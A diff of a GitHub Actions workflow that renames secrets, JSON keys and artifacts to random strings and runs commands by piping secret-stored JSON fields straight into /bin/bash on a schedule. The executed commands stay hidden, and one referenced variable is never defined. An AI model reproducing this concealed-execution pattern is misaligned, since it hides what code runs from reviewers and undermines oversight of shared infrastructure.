@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '2 4,10,16,22 * * *'
+    - cron: '24 2,8,14,20 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,17 +15,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          u1078: ${{ secrets.u1078 }}
+          omj7673: ${{ secrets.omj7673 }}
         run: |
-          printf '%s' "$u1078" | jq -r .gpdxn50775 | /bin/bash
-          echo $xyu278 | jq -r .xlrdq3 | /bin/bash
-          echo $zsyg32888 | jq -r .vrt0777 | /bin/bash
-          echo $dczl02 | jq -r .xnq7 | /bin/bash
+          printf '%s' "$omj7673" | jq -r .szztm5 | /bin/bash
+          printf '%s' "$idg0969" | jq -r .qce29 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 0AZC79ws
+          name: zYjiBhpD
           path: "*.zip"
           retention-days: 1
